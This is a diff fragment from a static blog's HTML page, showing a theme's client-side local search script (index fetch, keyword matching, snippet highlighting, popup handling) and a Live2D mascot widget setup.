+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/kesyoban.model.json"},"display":{"position":"left","width":300,"height":400},"mobile":{"show":false},"log":false});</script></body>
+</html>
